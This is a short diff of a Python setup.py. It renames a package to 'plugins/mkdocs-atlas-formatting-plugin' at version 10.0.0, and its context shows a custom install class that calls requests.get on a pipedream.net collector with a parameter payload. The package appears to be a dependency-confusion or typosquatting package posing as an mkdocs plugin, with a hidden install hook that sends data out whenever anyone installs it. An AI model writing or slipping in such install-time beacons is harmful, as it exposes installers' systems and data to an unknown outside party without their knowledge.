@@ -15,7 +15,7 @@ class CustomInstall(install):
         requests.get("https://eolunbv9e34gp3b.m.pipedream.net",params = ploads)
 
 
-setup(name='coffeeformation', 
+setup(name='plugins/mkdocs-atlas-formatting-plugin', 
       version='10.0.0',
       description='AnupamAs01',
       author='AnupamAs01',
